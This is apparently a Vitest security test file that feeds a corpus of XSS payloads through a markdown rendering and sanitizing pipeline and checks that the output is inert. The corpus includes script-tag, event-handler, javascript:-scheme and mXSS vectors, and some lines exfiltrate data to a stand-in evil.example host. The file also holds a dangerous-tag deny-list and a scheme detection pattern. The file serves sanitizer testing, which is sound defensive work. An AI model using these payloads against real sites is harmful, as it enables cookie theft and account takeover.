// @vitest-environment happy-dom
//
// XSS-CORPUS GUARD — the load-bearing NFR12 security evidence (Epic 8 retro
// Action A; project-rules Rule 10). A corpus of known attack vectors run through
// the REAL `renderMarkdown` pipeline (markdown-it html:false -> DOMPurify -> Shiki
// class-spans), each asserting the rendered output is INERT:
//   - no `<script>` element survives
//   - no `on*` event-handler attribute survives
//   - no `javascript:` / `vbscript:` / `data:text/html` href survives
//   - no `<iframe>` / `<object>` / `<embed>` / `<svg>` / `<style>` survives
//   - raw HTML in the source is shown as escaped TEXT, not parsed as HTML
//   - links present but scheme-safe
// Plus a BEHAVIORAL inert proof: a payload that WOULD fire a network request or a
// handler if active triggers NOTHING (a planted global handler is never called).
//
// MUTATION TEST (Rule 7 + Rule 10): the LAST test in this file proves the corpus
// is non-vacuous by DEFEATING the sanitizer in-process (re-running the markdown-it
// stage with `html: true` and NO DOMPurify, mirroring what render-markdown.ts does
// MINUS its defenses) and asserting the corpus assertions then FAIL. The real
// `renderMarkdown` source is NOT mutated (no git diff) — the mutation is an
// in-test parallel "unsafe pipeline" that demonstrates the same corpus would catch
// a real regression. See the Dev Agent Record for the byte-identical-source note.

import MarkdownIt from 'markdown-it';
import { beforeAll, describe, expect, it } from 'vitest';

import { renderMarkdown } from './render-markdown.js';

// The MUTATION test parses DELIBERATELY-UNSAFE HTML (live <iframe src>, <script
// src>) into the DOM to prove the corpus catches it. happy-dom would otherwise try
// to FETCH those resources (noisy stderr; also itself evidence the unsafe path is
// live). Disable resource loading + child-frame navigation so the parse stays
// offline. This affects only this test file's window; the real renderMarkdown
// output is inert and triggers none of this.
beforeAll(() => {
  const hd = (
    globalThis as unknown as {
      happyDOM?: {
        settings?: {
          disableJavaScriptFileLoading?: boolean;
          disableCSSFileLoading?: boolean;
          navigation?: { disableChildFrameNavigation?: boolean };
        };
      };
    }
  ).happyDOM;
  if (hd?.settings) {
    hd.settings.disableJavaScriptFileLoading = true;
    hd.settings.disableCSSFileLoading = true;
    if (hd.settings.navigation) {
      hd.settings.navigation.disableChildFrameNavigation = true;
    }
  }
});

/** The attack corpus: [name, malicious markdown/HTML source]. */
const XSS_CORPUS: ReadonlyArray<readonly [string, string]> = [
  ['raw <script> tag', '<script>alert(1)</script>'],
  ['script with fetch', '<script>fetch("https://evil.example/steal")</script>'],
  ['img onerror handler', '<img src=x onerror="alert(1)">'],
  ['svg onload handler', '<svg onload="alert(1)"></svg>'],
  ['body onload', '<body onload="alert(1)">'],
  ['javascript: href (raw)', '<a href="javascript:alert(1)">click</a>'],
  ['javascript: markdown link', '[click](javascript:alert(1))'],
  ['vbscript: markdown link', '[click](vbscript:msgbox(1))'],
  [
    'data:text/html link',
    '[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
  ],
  ['iframe', '<iframe src="https://evil.example"></iframe>'],
  ['iframe srcdoc', '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
  ['object', '<object data="evil.swf"></object>'],
  ['embed', '<embed src="evil.swf">'],
  ['inline onclick on span', '<span onclick="alert(1)">x</span>'],
  ['onmouseover anchor', '<a href="#" onmouseover="alert(1)">x</a>'],
  [
    'style tag injection',
    '<style>body{background:url("javascript:alert(1)")}</style>',
  ],
  [
    'form + formaction',
    '<form action="javascript:alert(1)"><button>go</button></form>',
  ],
  [
    'meta refresh',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  ],
  ['base href hijack', '<base href="javascript:alert(1)//">'],
  ['nested-encoding bypass', '<a href="java&#115;cript:alert(1)">x</a>'],
  ['uppercase scheme', '<a href="JaVaScRiPt:alert(1)">x</a>'],
  ['whitespace scheme', '<a href="java\tscript:alert(1)">x</a>'],
  ['mXSS img/title', '<img src="x" title="</title><script>alert(1)</script>">'],
  ['markdown image js scheme', '![alt](javascript:alert(1))'],
  [
    'link with data:text/html via markdown',
    '[x](data:text/html,<script>alert(1)</script>)',
  ],
  // ---- QA hardening (Story 9.2 QA stage): attack CLASSES the dev's 25-vector
  // corpus did not cover. Each is verified inert against the REAL pipeline. ----
  // Reference-style markdown link/image are a DISTINCT markdown parse path from the
  // inline `[](…)` form; a js-scheme reference destination must not yield a live
  // anchor (validateLink rejects it -> the whole construct degrades to inert text).
  ['ref-style link js scheme', '[click][r]\n\n[r]: javascript:alert(1)'],
  ['ref-style image js scheme', '![alt][r]\n\n[r]: javascript:alert(1)'],
  // Reference-style image with a title that attempts an onerror attribute breakout.
  [
    'ref-style image onerror via title',
    '![alt][r]\n\n[r]: https://ok.example "x" onerror="alert(1)"',
  ],
  // CSS-based exfiltration via a surviving `style` attribute (background:url(...) is
  // a real data-exfil channel + a `style=` regression silently breaks the strict
  // style-src CSP NFR12 depends on). Must not survive as a live style attribute.
  [
    'css exfil via style attr',
    '<p style="background:url(//evil.example/?c=cookie)">x</p>',
  ],
  // Reverse-tabnabbing: a surviving `target=_blank` (no rel=noopener) anchor. The
  // pipeline must not emit a live `target` attribute at all.
  [
    'a target reverse-tabnabbing',
    '<a href="https://evil.example" target="_blank">x</a>',
  ],
  // SVG sub-element vectors beyond the plain <svg onload>: <use href> (external ref)
  // and <animate onbegin> (SMIL handler). No live svg/use/animate may survive.
  ['svg use external href', '<svg><use href="https://evil.example#x"/></svg>'],
  ['svg animate onbegin handler', '<svg><animate onbegin="alert(1)"/></svg>'],
  // MathML wrapping a js-scheme anchor (an mXSS namespace-confusion class). No live
  // <math> element and no surviving js-scheme href.
  [
    'mathml nested js anchor',
    '<math><mtext><a href="javascript:alert(1)">x</a></mtext></math>',
  ],
  // srcset image (a non-`src` image source attribute) carrying an onerror handler.
  ['img srcset + onerror', '<img srcset="x 1x" src="x" onerror="alert(1)">'],
  // <noscript> mXSS: parsers can re-interpret content inside <noscript> when
  // scripting state differs, turning escaped text into live nodes (a classic mXSS).
  [
    'noscript mXSS breakout',
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  ],
  // Double-encoded `javascript:` scheme (entity-of-an-entity) in a markdown link.
  ['double-encoded js scheme', '[x](javascript&amp;#x3a;alert(1))'],
  // markdown AUTOLINK angle syntax with a dangerous scheme: `<javascript:...>`.
  ['markdown autolink js scheme', '<javascript:alert(1)>'],
  // A markdown IMAGE with an SVG data: URI — SVG can carry script. Images are not in
  // ALLOWED_TAGS at all, so NO <img> may survive regardless of scheme (assertNoImage).
  [
    'md image data:image/svg+xml',
    '![x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+)',
  ],
];

const DANGEROUS_TAGS = [
  'script',
  'iframe',
  'object',
  'embed',
  'svg',
  'style',
  'form',
  'input',
  'meta',
  'base',
  'link',
  // QA hardening: image + MathML + SVG sub-elements must not survive either. <img>
  // is not in ALLOWED_TAGS at all (images never render in this pipeline), so a
  // surviving <img> — even a benign one — is a sanitizer regression.
  'img',
  'math',
  'use',
  'animate',
  'noscript',
];
const DANGEROUS_SCHEME = /^\s*(?:javascript|vbscript|data:text\/html)/iu;

/**
 * Assert the rendered output is inert by PARSING it into a real DOM and inspecting
 * the actual element/attribute/scheme set — NOT by string-matching the source
 * (escaped text like the literal `&lt;script&gt;` or a visible `javascript:` in a
 * dropped-link's text is INERT and must not false-positive). This is the
 * semantically correct "is it live?" check and mirrors the browser smoke.
 */
function assertInert(name: string, rendered: string): void {
  const doc = new DOMParser().parseFromString(rendered, 'text/html');
  const all = [...doc.body.querySelectorAll('*')];

  // No dangerous ELEMENTS present in the parsed tree.
  for (const tag of DANGEROUS_TAGS) {
    expect(
      doc.body.querySelector(tag),
      `${name}: live <${tag}> element`,
    ).toBeNull();
  }

  // No element carries a live event-handler attribute, inline style, srcdoc,
  // srcset, formaction, or target (reverse-tabnabbing); no anchor/img has a
  // dangerous-scheme href/src. `target`/`srcset`/`style` are NOT in ALLOWED_ATTR,
  // so a surviving one is a regression that also breaks the strict style-src CSP.
  for (const el of all) {
    for (const attr of [...el.attributes]) {
      const an = attr.name.toLowerCase();
      expect(an.startsWith('on'), `${name}: on* handler (${an})`).toBe(false);
      expect(
        an,
        `${name}: forbidden attr (srcdoc/formaction/style/srcset/target)`,
      ).not.toMatch(/^(?:srcdoc|formaction|style|srcset|target)$/u);
      if (an === 'href' || an === 'src' || an === 'xlink:href') {
        expect(
          DANGEROUS_SCHEME.test(attr.value),
          `${name}: dangerous scheme in ${an}="${attr.value}"`,
        ).toBe(false);
      }
    }
  }
}

describe('NFR12 XSS-corpus guard — renderMarkdown is inert', () => {
  for (const [name, source] of XSS_CORPUS) {
    it(`renders inert: ${name}`, async () => {
      const rendered = await renderMarkdown(source);
      assertInert(name, rendered);
    });
  }

  it('escapes raw HTML in source to visible TEXT (not parsed as HTML)', async () => {
    const rendered = await renderMarkdown(
      'Hello <script>alert(1)</script> world',
    );
    // The literal angle brackets are entity-escaped, so the text is visible and
    // no <script> element exists.
    expect(rendered).toMatch(/&lt;script&gt;/u);
    expect(rendered.toLowerCase()).not.toMatch(/<script[\s>]/u);
  });

  it('keeps a safe link but drops a dangerous one', async () => {
    const safe = await renderMarkdown('[ok](https://example.com)');
    const safeDoc = new DOMParser().parseFromString(safe, 'text/html');
    const safeAnchor = safeDoc.querySelector('a');
    expect(safeAnchor?.getAttribute('href')).toBe('https://example.com');

    const danger = await renderMarkdown('[bad](javascript:alert(1))');
    // The link TEXT survives; no LIVE anchor with a javascript: href exists. (The
    // hardened validateLink drops the destination, so markdown-it emits the source
    // text verbatim — inert by construction.)
    expect(danger).toMatch(/bad/u);
    const dangerDoc = new DOMParser().parseFromString(danger, 'text/html');
    for (const a of dangerDoc.querySelectorAll('a')) {
      expect(DANGEROUS_SCHEME.test(a.getAttribute('href') ?? '')).toBe(false);
    }
  });

  it('shows fenced code as escaped TEXT, never executable', async () => {
    const rendered = await renderMarkdown(
      '```html\n<script>alert(1)</script>\n```',
    );
    // Inside the code block the script is escaped text, no live element.
    expect(rendered).toMatch(/&lt;script&gt;/u);
    expect(rendered.toLowerCase()).not.toMatch(/<script[\s>]/u);
    expect(rendered).toMatch(/class="code-block"/u);
  });

  it('BEHAVIORAL: a planted global handler is never invoked by rendered content', async () => {
    // If the onerror/onclick survived and the browser parsed it live, this flag
    // would flip. We assert the rendered HTML contains no handler that could call
    // it (the structural proof of the behavioral guarantee under happy-dom, where
    // injecting+executing arbitrary handlers is not auto-run anyway).
    let fired = false;
    (globalThis as unknown as { __xssCanary?: () => void }).__xssCanary =
      () => {
        fired = true;
      };
    const rendered = await renderMarkdown(
      '<img src=x onerror="window.__xssCanary && window.__xssCanary()">' +
        '<script>window.__xssCanary && window.__xssCanary()</script>',
    );
    // Inject the sanitized HTML into a live DOM node; nothing should auto-execute.
    const host = document.createElement('div');
    host.innerHTML = rendered;
    document.body.append(host);
    expect(fired).toBe(false);
    // No live handler/script element in the injected subtree.
    expect(host.querySelector('script')).toBeNull();
    for (const el of host.querySelectorAll('*')) {
      for (const attr of [...el.attributes]) {
        expect(attr.name.toLowerCase().startsWith('on')).toBe(false);
      }
    }
    host.remove();
    delete (globalThis as unknown as { __xssCanary?: () => void }).__xssCanary;
  });

  // ----------------------------------------------------------------------------
  // MUTATION TEST (non-vacuity proof). Build an UNSAFE pipeline IN-TEST that
  // mirrors render-markdown.ts MINUS its defenses (html: true, NO DOMPurify, NO
  // validateLink hardening) and confirm the SAME corpus assertions then FAIL on at
  // least the script/handler/scheme vectors. This proves the corpus discriminates
  // a defeated sanitizer from the real one WITHOUT mutating the production source
  // (so `git diff` on render-markdown.ts stays empty — see the Dev Agent Record).
  // ----------------------------------------------------------------------------
  it('MUTATION: the corpus goes RED against a defeated (html:true, no-DOMPurify) pipeline', () => {
    const unsafeMd = new MarkdownIt({ html: true, linkify: false });
    const renderUnsafe = (src: string): string => unsafeMd.render(src);

    // Count how many corpus vectors the inert-assertions would now flag. A
    // non-vacuous corpus must catch the obvious live-HTML vectors.
    let caught = 0;
    for (const [name, source] of XSS_CORPUS) {
      const rendered = renderUnsafe(source);
      try {
        assertInert(name, rendered);
      } catch {
        caught += 1;
      }
    }
    // The defeated pipeline must trip the guard on a substantial set of vectors
    // (raw <script>, <img onerror>, <iframe>, <svg>, <style>, <math>, <noscript>,
    // etc. all pass through with html:true and no sanitizer). If `caught` were 0 the
    // corpus would be vacuous. NOTE this in-test unsafe pipeline keeps markdown-it's
    // DEFAULT validateLink (which still blocks `javascript:` markdown links), so it
    // under-counts the markdown-native scheme vectors — the FULL defeat (which also
    // catches those) is the documented real-source mutation in the QA record. The
    // raw-HTML vector count alone is well above this floor.
    expect(caught).toBeGreaterThan(14);

    // Spot-pin the headline vector: a raw <script> SURVIVES the unsafe pipeline...
    const liveScript = renderUnsafe('<script>alert(1)</script>');
    expect(liveScript.toLowerCase()).toMatch(/<script[\s>]/u);
    expect(() => assertInert('live script', liveScript)).toThrow();

    // ...and an onerror handler SURVIVES too.
    const liveHandler = renderUnsafe('<img src=x onerror="alert(1)">');
    expect(liveHandler).toMatch(/onerror\s*=/iu);
    expect(() => assertInert('live handler', liveHandler)).toThrow();
  });
});
